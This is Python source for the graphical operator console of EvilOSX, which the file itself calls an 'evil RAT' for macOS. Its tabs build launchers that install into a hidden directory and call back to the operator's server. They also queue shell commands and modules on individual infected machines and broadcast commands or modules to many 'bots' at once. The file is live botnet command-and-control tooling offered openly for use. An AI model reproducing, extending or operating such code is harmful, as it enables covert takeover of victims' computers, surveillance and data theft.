# -*- coding: utf-8 -*-
__author__ = "Marten4n6"
__license__ = "GPLv3"

from copy import deepcopy
from os import path
from time import strftime, localtime
from uuid import uuid4

from PySide6.QtCore import Qt, QObject, Signal, Slot
from PySide6.QtGui import QPalette, QColor, QPixmap
from PySide6.QtWidgets import QApplication, QMainWindow, QTabWidget, QTableWidget, QWidget, \
    QLabel, QHBoxLayout, QGridLayout, QSplitter, QAbstractItemView, QHeaderView, QTableWidgetItem, \
    QComboBox, QLineEdit, QPushButton, QVBoxLayout, QMessageBox, QTextEdit

from bot import launchers, loaders
from server import modules
from server.model import Command, CommandType
from server.modules.helper import ModuleViewABC
from server.version import VERSION
from server.view.helper import *


class LauncherBuilderTab(QWidget):
    """Generic builder tab that adapts to any Module's setup requirements."""

    def __init__(self, module=None):
        super(LauncherBuilderTab, self).__init__()

        self._module = module

        layout = QVBoxLayout()

        # If a module is provided, use its setup messages to dynamically build the form
        if self._module and hasattr(self._module, 'get_setup_messages'):
            messages = self._module.get_setup_messages()
            if messages:
                for msg in messages:
                    label = QLabel(msg)
                    layout.addWidget(label)
                    # Placeholder input for each message
                    input_field = QLineEdit()
                    layout.addWidget(input_field)

        layout.setContentsMargins(10, 10, 10, 0)
        layout.setAlignment(Qt.AlignTop)
        self.setLayout(layout)

    @staticmethod
    def display_error(text):
        """Displays an error message to the user.

        :type text: str
        """
        message = QMessageBox()

        message.setIcon(QMessageBox.Critical)
        message.setWindowTitle("Error")
        message.setText(text)
        message.setStandardButtons(QMessageBox.Ok)
        message.exec_()

    @staticmethod
    def display_info(text):
        """
        :type text: str
        """
        message = QMessageBox()

        message.setIcon(QMessageBox.Information)
        message.setWindowTitle("Information")
        message.setText(text)
        message.setStandardButtons(QMessageBox.Ok)
        message.exec_()

    def _on_create_launcher(self, server_host, server_port, program_directory,
                            loader_name, launcher_name, input_fields):
        """Creates the launcher and outputs it to the builds directory.

        :type server_host: str
        :type server_port: int
        :type program_directory: str
        :type loader_name: str
        :type launcher_name: str
        :type input_fields: list
        """
        if not self._host_field.text():
            self.display_error("Invalid host specified.")
        elif not str(self._port_field.text()).isdigit():
            self.display_error("Invalid port specified.")
        else:
            set_options = []

            for field in input_fields:
                set_options.append(field.text())

            if not program_directory:
                program_directory = "~/Library/Containers/.{}".format(launchers.get_random_string())

            loader_options = loaders.get_options(loader_name, set_options)
            loader_options["program_directory"] = program_directory

            stager = launchers.create_stager(server_host, int(server_port), loader_options)

            launcher_extension, launcher = launchers.generate(launcher_name, stager)
            launcher_path = path.realpath(path.join(
                path.dirname(__file__), path.pardir, path.pardir, "data", "builds", "Launcher-{}.{}".format(
                    str(uuid4())[:6], launcher_extension
                )))

            with open(launcher_path, "w") as output_file:
                output_file.write(launcher)

            self.display_info("Launcher written to: \n{}".format(launcher_path))


class _BroadcastBotTable(QTableWidget):
    """Table of bots with a checkbox per row, used to pick broadcast targets."""

    _HEADER_LABELS = ["Target", "UID", "Username", "Version"]

    def __init__(self):
        super(_BroadcastBotTable, self).__init__()

        self.setColumnCount(len(self._HEADER_LABELS))
        self.setHorizontalHeaderLabels(self._HEADER_LABELS)

        self.setAlternatingRowColors(True)
        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)

        self.horizontalHeader().setSectionResizeMode(0, QHeaderView.ResizeToContents)
        for i in range(1, len(self._HEADER_LABELS)):
            self.horizontalHeader().setSectionResizeMode(i, QHeaderView.Stretch)

    def _checked_uids(self):
        """
        :rtype: list[str]
        """
        uids = []

        for row in range(self.rowCount()):
            item = self.item(row, 0)

            if item is not None and item.checkState() == Qt.Checked:
                uid_item = self.item(row, 1)

                if uid_item is not None:
                    uids.append(uid_item.text())

        return uids

    def refresh(self, bots):
        """Rebuilds the table, keeping the check state of bots which are still present.

        :type bots: list[Bot]
        """
        previous_states = {}

        for row in range(self.rowCount()):
            check_item = self.item(row, 0)
            uid_item = self.item(row, 1)

            if check_item is not None and uid_item is not None:
                previous_states[uid_item.text()] = check_item.checkState()

        self.setRowCount(0)
        self.setRowCount(len(bots))

        for row, bot in enumerate(bots):
            check_item = QTableWidgetItem("")
            check_item.setFlags(Qt.ItemIsUserCheckable | Qt.ItemIsEnabled)
            # Known bots keep their previous check state, new bots default to checked.
            check_item.setCheckState(previous_states.get(bot.uid, Qt.Checked))

            self.setItem(row, 0, check_item)

            for column, text in enumerate(
                    [bot.uid, bot.username + "@" + bot.hostname, bot.system_version or ""], start=1):
                item = QTableWidgetItem(text)
                item.setFlags(Qt.ItemIsEnabled | Qt.ItemIsSelectable)
                self.setItem(row, column, item)

    def set_all_checked(self, checked):
        """
        :type checked: bool
        """
        state = Qt.Checked if checked else Qt.Unchecked

        for row in range(self.rowCount()):
            item = self.item(row, 0)

            if item is not None:
                item.setCheckState(state)

    def checked_uids(self):
        """ :rtype: list[str] """
        return self._checked_uids()


class _BroadcastTab(QWidget):
    """Tab used to interact with the whole botnet at once."""

    def __init__(self, model):
        super(_BroadcastTab, self).__init__()

        self._model = model
        self._responses_tab = _ResponsesTab()
        self._module_view = ModuleView(self._responses_tab)

        self._layout = QGridLayout()
        self._options_layout = QVBoxLayout()

        splitter = QSplitter()
        selection_widget = QWidget()

        # Target selection
        self._bot_table = _BroadcastBotTable()

        select_all_button = QPushButton("Select all")
        select_none_button = QPushButton("Select none")
        refresh_button = QPushButton("Refresh")

        for button in [select_all_button, select_none_button, refresh_button]:
            button.setMaximumWidth(120)

        select_all_button.pressed.connect(lambda: self._bot_table.set_all_checked(True))
        select_none_button.pressed.connect(lambda: self._bot_table.set_all_checked(False))
        refresh_button.pressed.connect(self.refresh_bots)

        target_buttons = QHBoxLayout()
        target_buttons.addWidget(select_all_button)
        target_buttons.addWidget(select_none_button)
        target_buttons.addWidget(refresh_button)
        target_buttons.addStretch(1)

        # Command selection
        self._command_type_combobox = QComboBox()
        self._command_type_combobox.addItem("Module")
        self._command_type_combobox.addItem("Shell")
        self._command_type_combobox.currentTextChanged.connect(self._on_command_type_change)

        self._module_combobox = QComboBox()

        for module_name in modules.get_names():
            self._module_combobox.addItem(module_name)

        self._module_combobox.currentTextChanged.connect(self._on_module_change)

        self._shell_input = QLineEdit()

        self._run_button = QPushButton("Broadcast")
        self._run_button.setMaximumWidth(250)
        self._run_button.setMinimumHeight(25)
        self._run_button.pressed.connect(self._on_run)

        run_layout = QHBoxLayout()
        run_layout.addWidget(self._run_button)
        run_layout.addStretch(1)

        self._layout.setColumnStretch(1, 1)
        self._layout.setAlignment(Qt.AlignTop)
        self._layout.addWidget(QLabel("Targets (check the bots to broadcast to):"), 0, 0, 1, 2)
        self._layout.addWidget(self._bot_table, 1, 0, 1, 2)
        self._layout.addLayout(target_buttons, 2, 0, 1, 2)
        self._layout.addWidget(QLabel("Command type: "), 3, 0)
        self._layout.addWidget(self._command_type_combobox, 3, 1)
        self._layout.addWidget(QLabel("Module name: "), 4, 0)
        self._layout.addWidget(self._module_combobox, 4, 1)
        self._layout.addWidget(QLabel("Command: "), 5, 0)
        self._layout.addWidget(self._shell_input, 5, 1)
        self._layout.addLayout(self._options_layout, 6, 0, 1, 2)
        self._layout.addLayout(run_layout, 7, 0, 1, 2)

        selection_widget.setLayout(self._layout)

        splitter.setOrientation(Qt.Vertical)
        splitter.addWidget(selection_widget)
        splitter.addWidget(self._responses_tab)
        splitter.setSizes([300, 150])

        layout = QVBoxLayout()
        layout.addWidget(splitter)
        self.setLayout(layout)

        self._on_command_type_change(self._command_type_combobox.currentText())
        self.refresh_bots()

    def showEvent(self, event):
        # Keep the target list in sync with the bot table of the Control tab.
        self.refresh_bots()
        super(_BroadcastTab, self).showEvent(event)

    def refresh_bots(self):
        """Reloads the bot list, keeping previously checked targets checked."""
        self._bot_table.refresh(self._model.get_bots())

    def _on_command_type_change(self, text):
        """Shows the fields which belong to the selected command type.

        :type text: str
        """
        is_module = text == "Module"

        self._module_combobox.setVisible(is_module)
        self._layout.itemAtPosition(4, 0).widget().setVisible(is_module)

        self._shell_input.setVisible(not is_module)
        self._layout.itemAtPosition(5, 0).widget().setVisible(not is_module)

        if is_module:
            self._on_module_change(self._module_combobox.currentText())
        else:
            self._clear_options_layout()

    def _clear_options_layout(self):
        while self._options_layout.count():
            child = self._options_layout.takeAt(0)

            if child.widget():
                child.widget().deleteLater()
            elif child.layout():
                while child.layout().count():
                    inner = child.layout().takeAt(0)

                    if inner.widget():
                        inner.widget().deleteLater()

    def _on_module_change(self, module_name):
        """Rebuilds the module option input fields.

        :type module_name: str
        """
        self._clear_options_layout()

        if self._command_type_combobox.currentText() != "Module" or not module_name:
            return

        cached_module = modules.get_module(module_name)

        if not cached_module:
            cached_module = modules.load_module(module_name, self._module_view, self._model)

        for message in cached_module.get_setup_messages():
            input_field = QLineEdit()

            self._options_layout.addWidget(QLabel(message))
            self._options_layout.addWidget(input_field)

    def _option_fields(self):
        """
        :rtype: list[QLineEdit]
        """
        fields = []

        for index in range(self._options_layout.count()):
            widget = self._options_layout.itemAt(index).widget()

            if isinstance(widget, QLineEdit):
                fields.append(widget)

        return fields

    def _on_run(self):
        """Queues the selected command for every checked bot."""
        target_uids = self._bot_table.checked_uids()

        if not target_uids:
            self._responses_tab.output("No targets selected, check at least one bot.")
            return

        targets = []

        for bot_uid in target_uids:
            try:
                targets.append(self._model.get_bot(bot_uid))
            except Exception:
                # The bot disappeared between the refresh and now.
                pass

        if not targets:
            self._responses_tab.output("None of the selected bots are still connected.")
            return

        if self._command_type_combobox.currentText() == "Module":
            self._broadcast_module(targets)
        else:
            self._broadcast_shell(targets)

    def _broadcast_shell(self, targets):
        """
        :type targets: list[Bot]
        """
        command = self._shell_input.text().strip()

        if not command:
            return

        for bot in targets:
            self._model.add_command(bot.uid, Command(CommandType.SHELL, command.encode()))

        self._responses_tab.output_separator()
        self._responses_tab.output("Broadcast shell command to {} bot(s): {}".format(len(targets), command))

        for bot in targets:
            self._responses_tab.output("  - " + bot.username + "@" + bot.hostname)

        self._shell_input.clear()

    def _broadcast_module(self, targets):
        """
        :type targets: list[Bot]
        """
        module_name = self._module_combobox.currentText()

        if not module_name:
            return

        module = modules.get_module(module_name)

        if not module:
            module = modules.load_module(module_name, self._module_view, self._model)

        set_options = []

        for input_field in self._option_fields():
            set_options.append(input_field.text())

        try:
            successful, options = module.setup(set_options)
        except Exception as error:
            self._responses_tab.output("Module setup error: {}".format(error))
            return

        if not successful:
            return

        self._responses_tab.output_separator()
        self._responses_tab.output("Broadcasting module '{}' to {} bot(s)".format(
            module_name, len(targets)
        ))

        queued = 0

        for bot in targets:
            # Each bot gets its own copy, modules may mutate nested values.
            bot_options = deepcopy(options) if options else {}
            bot_options["module_name"] = module_name

            # Modules which save a response to disk would otherwise overwrite
            # each other's output when broadcasting to multiple bots.
            response_options = bot_options.get("response_options")

            if len(targets) > 1 and isinstance(response_options, dict) and response_options.get("output_name"):
                base_name, extension = path.splitext(response_options["output_name"])
                safe_hostname = "".join(
                    character if character.isalnum() or character in "-_" else "_"
                    for character in bot.hostname
                )
                response_options["output_name"] = "{}_{}{}".format(base_name, safe_hostname, extension)

            if module_name == "remove_bot":
                code = loaders.get_remove_code(bot.loader_name)
            elif module_name == "update_bot":
                code = loaders.get_update_code(bot.loader_name)
            else:
                code = modules.get_code(module_name)

            self._model.add_command(bot.uid, Command(CommandType.MODULE, code, bot_options))
            queued += 1

            self._responses_tab.output("  - " + bot.username + "@" + bot.hostname)

        self._responses_tab.output("Queued for {} bot(s), responses appear in the Control tab.".format(queued))


class _ResponsesTab(QTabWidget):
    """Tab which shows all module and shell responses."""

    def __init__(self):
        super(_ResponsesTab, self).__init__()

        layout = QVBoxLayout()
        self._output_field = QTextEdit()

        self._output_field.setTextInteractionFlags(Qt.NoTextInteraction)
        self._output_field.setPlaceholderText("Please wait for responses...")

        layout.addWidget(self._output_field)
        self.setLayout(layout)

    def clear(self):
        """Clears all output."""
        self._output_field.clear()

    def output(self, text):
        """Adds a line to the output field.

        :type text: str
        """
        self._output_field.append(text)

    def output_separator(self):
        """Adds a separator line to the output field."""
        self._output_field.append("-" * 5)


class ModuleView(ModuleViewABC):
    """Used by modules to interact with this GUI."""

    def __init__(self, responses_tab):
        """
        :type responses_tab: _ResponsesTab
        """
        self._responses_tab = responses_tab

    def display_error(self, text):
        """
        :type text: str
        """
        message_box = QMessageBox()

        message_box.setIcon(QMessageBox.Critical)
        message_box.setWindowTitle("Error")
        message_box.setText(text)
        message_box.setStandardButtons(QMessageBox.Ok)
        message_box.exec_()

    def display_info(self, text):
        """
        :type text: str
        """
        message_box = QMessageBox()

        message_box.setIcon(QMessageBox.Information)
        message_box.setWindowTitle("Information")
        message_box.setText(text)
        message_box.setStandardButtons(QMessageBox.Ok)
        message_box.exec_()

    def should_continue(self, messages):
        """
        :type messages: list[str]
        :rtype: bool
        """
        messages.append("\nAre you sure you want to continue?")

        confirm = QMessageBox.question(self._responses_tab, "Confirmation",
                                       "\n".join(messages), QMessageBox.Yes, QMessageBox.No)

        if confirm == QMessageBox.Yes:
            return True
        else:
            return False

    def output(self, line, prefix=""):
        """
        :type line: str
        :type prefix: str
        """
        self._responses_tab.output(line)


class _ExecuteTab(QTabWidget):
    """Tab used to execute modules or shell commands on the selected bot."""

    def __init__(self, responses_tab, model):
        """
        :type responses_tab: _ResponsesTab
        """
        super(_ExecuteTab, self).__init__()

        self._model = model
        self._current_layout = None
        self._current_bot = None

        self._layout = QGridLayout()
        self._sub_layout = QVBoxLayout()
        self._module_view = ModuleView(responses_tab)

        self._layout.setAlignment(Qt.AlignTop)
        self.setLayout(self._layout)
        self.set_empty_layout()

    def set_current_bot(self, bot):
        """Sets the connected bot this tab will interact with.

        :type bot: Bot
        """
        self._current_bot = bot

    def _clear_layout(self):
        while self._layout.count():
            child = self._layout.takeAt(0)

            if child.widget():
                child.widget().deleteLater()
        while self._sub_layout.count():
            child = self._sub_layout.takeAt(0)

            if child.widget():
                child.widget().deleteLater()

    def set_empty_layout(self):
        """Default layout shown when the user has not yet selected a row."""
        self._current_layout = "Empty"
        self._clear_layout()

        self._layout.addWidget(QLabel("Please select a bot in the table above."), 0, 0)

    def set_module_layout(self, module_name="screenshot"):
        """Sets the layout which can execute modules.

        :type module_name: str
        """
        self._current_layout = "Module"
        self._clear_layout()

        command_type_label = QLabel("Command type: ")
        command_type_combobox = QComboBox()

        command_type_combobox.addItem("Module")
        command_type_combobox.addItem("Shell")

        module_label = QLabel("Module name: ")
        module_combobox = QComboBox()

        for module_name in modules.get_names():
            module_combobox.addItem(module_name)

        module_combobox.currentTextChanged.connect(self._on_module_change)
        command_type_combobox.currentTextChanged.connect(self._on_command_type_change)

        self._layout.setColumnStretch(1, 1)
        self._layout.addWidget(command_type_label, 0, 0)
        self._layout.addWidget(command_type_combobox, 0, 1)
        self._layout.addWidget(module_label, 1, 0)
        self._layout.addWidget(module_combobox, 1, 1)

        # Module layout
        cached_module = modules.get_module(module_name)

        if not cached_module:
            cached_module = modules.load_module(module_name, self._module_view, self._model)

        input_fields = []

        for option_name in cached_module.get_setup_messages():
            input_field = QLineEdit()

            self._sub_layout.addWidget(QLabel(option_name))
            self._sub_layout.addWidget(input_field)
            input_fields.append(input_field)

        run_button = QPushButton("Run")
        run_button.setMaximumWidth(250)
        run_button.setMinimumHeight(25)

        run_button.pressed.connect(lambda: self._on_module_run(module_combobox.currentText(), input_fields))

        self._sub_layout.addWidget(QLabel(""))
        self._sub_layout.addWidget(run_button)
        self._sub_layout.setContentsMargins(0, 15, 0, 0)
        self._layout.addLayout(self._sub_layout, self._layout.rowCount() + 2, 0, 1, 2)

        self._on_module_change(module_combobox.currentText())

    def set_shell_layout(self):
        """Sets the layout which can execute shell commands."""
        self._current_layout = "Shell"
        self._clear_layout()

        command_type_label = QLabel("Command type: ")
        command_type_combobox = QComboBox()

        command_type_combobox.addItem("Shell")
        command_type_combobox.addItem("Module")

        command_label = QLabel("Command:")
        command_input = QLineEdit()

        run_button = QPushButton("Run")
        run_button.setMaximumWidth(250)
        run_button.setMinimumHeight(25)

        command_type_combobox.currentTextChanged.connect(self._on_command_type_change)
        run_button.pressed.connect(lambda: self._on_command_run(command_input))

        self._layout.addWidget(command_type_label, 0, 0)
        self._layout.addWidget(command_type_combobox, 0, 1)
        self._layout.addWidget(command_label, 1, 0)
        self._layout.addWidget(command_input, 1, 1)

        self._sub_layout.addWidget(QLabel(""))
        self._sub_layout.addWidget(run_button)
        self._sub_layout.setContentsMargins(0, 15, 0, 0)
        self._layout.addLayout(self._sub_layout, self._layout.rowCount() + 2, 0, 1, 2)

    def _on_command_type_change(self, text):
        """Handles the command type combobox change event.

        :type text: str
        """
        if text == "Module":
            self.set_module_layout()
        else:
            self.set_shell_layout()

    def _on_module_change(self, module_name):
        """Handles module combobox changes.

        :type module_name: str
        """
        while self._sub_layout.count():
            child = self._sub_layout.takeAt(0)

            if child.widget():
                child.widget().deleteLater()

        cached_module = modules.get_module(module_name)

        if not cached_module:
            cached_module = modules.load_module(module_name, self._module_view, self._model)

        input_fields = []

        for option_name in cached_module.get_setup_messages():
            input_field = QLineEdit()
            input_fields.append(input_field)

            self._sub_layout.addWidget(QLabel(option_name))
            self._sub_layout.addWidget(input_field)

        run_button = QPushButton("Run")
        run_button.setMaximumWidth(250)
        run_button.setMinimumHeight(25)

        run_button.pressed.connect(lambda: self._on_module_run(module_name, input_fields))

        self._sub_layout.addWidget(QLabel(""))
        self._sub_layout.addWidget(run_button)
        self._sub_layout.setContentsMargins(0, 15, 0, 0)

    def display_info(self, text):
        """
        :type text: str
        """
        message_box = QMessageBox()

        message_box.setIcon(QMessageBox.Information)
        message_box.setWindowTitle("Information")
        message_box.setText(text)
        message_box.setStandardButtons(QMessageBox.Ok)
        message_box.exec_()

    def _on_module_run(self, module_name, input_fields):
        """Handles running modules.

        :type module_name: str
        :type input_fields: list
        """
        if self._current_bot is None:
            self.display_info("Please select a bot in the table above first.")
            return

        set_options = []

        for input_field in input_fields:
            set_options.append(input_field.text())

        module = modules.get_module(module_name)

        if not module:
            module = modules.load_module(module_name, self._module_view, self._model)

        successful, options = module.setup(set_options)

        if successful:
            try:
                if module_name == "remove_bot":
                    code = loaders.get_remove_code(self._current_bot.loader_name)
                elif module_name == "update_bot":
                    code = loaders.get_update_code(self._current_bot.loader_name)
                else:
                    code = modules.get_code(module_name)
            except Exception as ex:
                self.display_info("Module error ({}): {}".format(module_name, ex))
                return

            if not options:
                options = {}

            options["module_name"] = module_name

            self._model.add_command(self._current_bot.uid, Command(
                CommandType.MODULE, code, options
            ))

            self.display_info("Module added to the queue of:\n {}@{}".format(
                self._current_bot.username, self._current_bot.hostname)
            )

    def _on_command_run(self, command_input):
        """Handles running commands.

        :type command_input: QLineEdit
        """
        if self._current_bot is None:
            self.display_info("Please select a bot in the table above first.")
            return

        if command_input.text().strip() == "":
            return

        self._model.add_command(self._current_bot.uid, Command(CommandType.SHELL, command_input.text().encode()))

        command_input.clear()
        self.display_info("Command added to the queue of:\n {}@{}".format(
            self._current_bot.username, self._current_bot.hostname
        ))


class _BotTable(QTableWidget):
    """Table which holds all bots."""

    def __init__(self):
        super(_BotTable, self).__init__()

        self._header_labels = ["UID", "Username", "Version", "Last Seen"]

        self.setColumnCount(len(self._header_labels))
        self.setHorizontalHeaderLabels(self._header_labels)

        self.setSelectionBehavior(QAbstractItemView.SelectRows)
        self.setAlternatingRowColors(True)
        self.setHorizontalScrollBarPolicy(Qt.ScrollBarAlwaysOff)
        self.setEditTriggers(QAbstractItemView.NoEditTriggers)

        for i in range(len(self._header_labels)):
            self.horizontalHeader().setSectionResizeMode(i, QHeaderView.Stretch)

    def set_on_selection_changed(self, callback_function):
        self.itemSelectionChanged.connect(callback_function)

    def add_bot(self, bot):
        """Adds a bot to the table.

        :rtype bot: Bot
        """
        self.setRowCount(self.rowCount() + 1)
        created_row = self.rowCount() - 1

        self.setItem(created_row, 0, QTableWidgetItem(bot.uid))
        self.setItem(created_row, 1, QTableWidgetItem(bot.username + "@" + bot.hostname))
        self.setItem(created_row, 2, QTableWidgetItem(bot.system_version))
        self.setItem(created_row, 3, QTableWidgetItem(
            strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
        ))

    def remove_bot(self, bot):
        """Removes a bot from the table.

        :rtype bot: Bot
        """
        for row in range(self.rowCount()):
            item = self.item(row, 0)
            if item is not None and item.text() == bot.uid:
                self.removeRow(row)
                break

    def update_bot_seen(self, bot):
        """Refresh Last Seen / path metadata for an existing bot row."""
        for row in range(self.rowCount()):
            item = self.item(row, 0)
            if item is not None and item.text() == bot.uid:
                self.setItem(row, 1, QTableWidgetItem(bot.username + "@" + bot.hostname))
                self.setItem(row, 2, QTableWidgetItem(bot.system_version or ""))
                self.setItem(row, 3, QTableWidgetItem(
                    strftime("%a, %b %d @ %H:%M:%S", localtime(bot.last_online))
                ))
                break


class _ControlTab(QWidget):
    """Tab which allows the user to control individual bots.

    Handles any events fired by the table etc.
    """

    def __init__(self, model):
        super(_ControlTab, self).__init__()

        self._model = model

        layout = QGridLayout()
        splitter = QSplitter()

        self._bot_table = _BotTable()
        self._responses_tab = _ResponsesTab()
        self._execute_tab = _ExecuteTab(self._responses_tab, model)

        self._tab_widget = QTabWidget()
        self._tab_widget.addTab(self._execute_tab, "Execute")
        self._tab_widget.addTab(self._responses_tab, "Responses")

        splitter.setOrientation(Qt.Vertical)
        splitter.addWidget(self._bot_table)
        splitter.addWidget(self._tab_widget)
        splitter.setSizes([50, 100])

        layout.addWidget(splitter)
        self.setLayout(layout)

        self._register_listeners()

    def _register_listeners(self):
        self._bot_table.set_on_selection_changed(self.on_table_selection_changed)

    def on_table_selection_changed(self):
        row = self._bot_table.currentRow()
        if row < 0:
            return
        uid_item = self._bot_table.item(row, 0)
        if uid_item is None:
            return
        bot_uid = uid_item.text()
        try:
            bot = self._model.get_bot(bot_uid)
        except Exception:
            return

        self._execute_tab.set_current_bot(bot)
        self._execute_tab.set_module_layout()
        self._responses_tab.clear()

    def get_table(self):
        """
        :rtype: _BotTable
        """
        return self._bot_table

    def get_responses_tab(self):
        """
        :rtype: _ResponsesTab
        """
        return self._responses_tab


class _HomeTab(QWidget):
    """Home tab which contains information about EvilOSX."""

    def __init__(self):
        super(_HomeTab, self).__init__()

        self._layout = QHBoxLayout()
        self.setLayout(self._layout)

        message_label = QLabel("""\
        Welcome to <b>EvilOSX</b>:<br/>
        An evil RAT (Remote Administration Tool) for macOS / OS X.<br/><br/><br/>

        Author: Marten4n6<br/>
        License: GPLv3<br/>
        Version: <b>{}</b>
        """.format(VERSION))
        logo_label = QLabel()

        logo_path = path.join(path.dirname(__file__), path.pardir, path.pardir, "data", "images", "logo_334x600.png")
        logo_label.setPixmap(QPixmap(logo_path))

        self._layout.setAlignment(Qt.AlignCenter)
        self._layout.setSpacing(50)
        self._layout.addWidget(message_label)
        self._layout.addWidget(logo_label)


class _TabbedWidget(QTabWidget):
    """Widget which holds all tabs."""

    def __init__(self, model):
        super(_TabbedWidget, self).__init__()

        self._home_tab = _HomeTab()
        self._control_tab = _ControlTab(model)
        self._broadcast_tab = _BroadcastTab(model)
        self._builder_tab = LauncherBuilderTab()

        self.addTab(self._home_tab, "Home")
        self.addTab(self._control_tab, "Control")
        self.addTab(self._broadcast_tab, "Broadcast")
        self.addTab(self._builder_tab, "Builder")

        self.currentChanged.connect(self._on_tab_changed)

    def _on_tab_changed(self, index):
        """Refreshes the broadcast target list when its tab is opened.

        :type index: int
        """
        if self.widget(index) is self._broadcast_tab:
            self._broadcast_tab.refresh_bots()

    def get_home_tab(self):
        """
        :rtype: _HomeTab
        """
        return self._home_tab

    def get_control_tab(self):
        """
        :rtype: _ControlTab
        """
        return self._control_tab

    def get_broadcast_tab(self):
        """
        :rtype: _BroadcastTab
        """
        return self._broadcast_tab

    def get_builder_tab(self):
        """
        :rtype: LauncherBuilderTab
        """
        return self._builder_tab


class _MainWindow(QMainWindow):
    """Main GUI window which displays the tabbed widget."""

    def __init__(self, central_widget):
        """
        :type central_widget: QWidget
        """
        super(_MainWindow, self).__init__()

        self.setGeometry(0, 0, 1000, 680)
        self.setCentralWidget(central_widget)


class _QDarkPalette(QPalette):
    """Dark palette for a Qt application."""

    def __init__(self):
        super(_QDarkPalette, self).__init__()

        self._color_white = QColor(255, 255, 255)
        self._color_black = QColor(0, 0, 0)
        self._color_red = QColor(255, 0, 0)
        self._color_primary = QColor(53, 53, 53)
        self._color_secondary = QColor(35, 35, 35)
        self._color_tertiary = QColor(42, 130, 218)

        self.setColor(QPalette.Window, self._color_primary)
        self.setColor(QPalette.WindowText, self._color_white)
        self.setColor(QPalette.Base, self._color_secondary)
        self.setColor(QPalette.AlternateBase, self._color_primary)
        self.setColor(QPalette.ToolTipBase, self._color_white)
        self.setColor(QPalette.ToolTipText, self._color_white)
        self.setColor(QPalette.Text, self._color_white)
        self.setColor(QPalette.Button, self._color_primary)
        self.setColor(QPalette.ButtonText, self._color_white)
        self.setColor(QPalette.BrightText, self._color_red)
        self.setColor(QPalette.Link, self._color_tertiary)
        self.setColor(QPalette.Highlight, self._color_tertiary)
        self.setColor(QPalette.HighlightedText, self._color_black)

    def apply(self, application):
        """Apply this theme to the given application.

        :type application: QApplication
        """
        application.setStyle("Fusion")
        application.setPalette(self)
        application.setStyleSheet("QToolTip {{"
                                  "color: {white};"
                                  "background-color: {tertiary};"
                                  "border: 1px solid {white};"
                                  "}}".format(white="rgb({}, {}, {})".format(*self._color_white.getRgb()),
                                              tertiary="rgb({}, {}, {})".format(*self._color_tertiary.getRgb())))


class _GuiBridge(QObject):
    """Moves handler-thread events onto the Qt UI thread."""
    bot_added = Signal(object)
    bot_removed = Signal(object)
    bot_updated = Signal(object)
    response = Signal(str)
    output_line = Signal(str)


class ViewGUI(ViewABC):
    """This class interacts with the user via a graphical user interface.

    Used by the controller to communicate with the view.
    """

    def __init__(self, model, server_port):
        """
        :type server_port: int
        """
        self._model = model
        self._server_port = server_port

        self._application = QApplication([])
        self._bridge = _GuiBridge()
        self._tabbed_widget = _TabbedWidget(model)
        self._main_window = _MainWindow(self._tabbed_widget)

        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, str(server_port)))

        _QDarkPalette().apply(self._application)

        # Cross-thread UI marshaling (HTTP handler runs off the UI thread).
        self._bridge.bot_added.connect(self._ui_bot_added)
        self._bridge.bot_removed.connect(self._ui_bot_removed)
        self._bridge.bot_updated.connect(self._ui_bot_updated)
        self._bridge.response.connect(self._ui_response)
        self._bridge.output_line.connect(self._ui_output_line)

    def get_tabbed_widget(self):
        """
        :rtype: QWidget
        """
        return self._tabbed_widget

    def output(self, line, prefix=""):
        """
        :rtype: line: str
        :rtype: prefix: str
        """
        # Always marshal to UI thread.
        self._bridge.output_line.emit(str(line))

    def on_response(self, response):
        """
        :type response: str
        """
        self._bridge.response.emit(str(response) if response is not None else "")

    def on_bot_added(self, bot):
        """
        :rtype: Bot
        """
        self._bridge.bot_added.emit(bot)

    def on_bot_removed(self, bot):
        """
        :type: Bot
        """
        self._bridge.bot_removed.emit(bot)

    def on_bot_path_change(self, bot):
        """
        :type bot: Bot
        """
        # Refresh last-seen / path in the table when the bot reports a path change.
        self._bridge.bot_updated.emit(bot)

    def on_bot_seen(self, bot):
        """Optional hook when an already-known bot polls again."""
        self._bridge.bot_updated.emit(bot)

    @Slot(object)
    def _ui_bot_added(self, bot):
        table = self._tabbed_widget.get_control_tab().get_table()
        # Avoid duplicate rows if the same bot re-joins after a UI race.
        for row in range(table.rowCount()):
            item = table.item(row, 0)
            if item is not None and item.text() == bot.uid:
                table.update_bot_seen(bot)
                break
        else:
            table.add_bot(bot)
        self._tabbed_widget.get_broadcast_tab().refresh_bots()
        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: {}".format(
            VERSION, str(self._server_port), self._model.get_bot_amount()
        ))

    @Slot(object)
    def _ui_bot_removed(self, bot):
        self._tabbed_widget.get_control_tab().get_table().remove_bot(bot)
        self._tabbed_widget.get_broadcast_tab().refresh_bots()
        self._main_window.setWindowTitle("EvilOSX v{} | Port: {} | Available bots: {}".format(
            VERSION, str(self._server_port), self._model.get_bot_amount()
        ))

    @Slot(object)
    def _ui_bot_updated(self, bot):
        self._tabbed_widget.get_control_tab().get_table().update_bot_seen(bot)

    @Slot(str)
    def _ui_response(self, response):
        responses_tab = self._tabbed_widget.get_control_tab().get_responses_tab()
        self.output_separator()
        for line in response.splitlines() or [response]:
            responses_tab.output(line)

    @Slot(str)
    def _ui_output_line(self, line):
        self._tabbed_widget.get_control_tab().get_responses_tab().output(line)

    def start(self):
        self._main_window.show()
        # PySide6 prefers exec(); exec_ remains as a compatibility alias.
        self._application.exec()
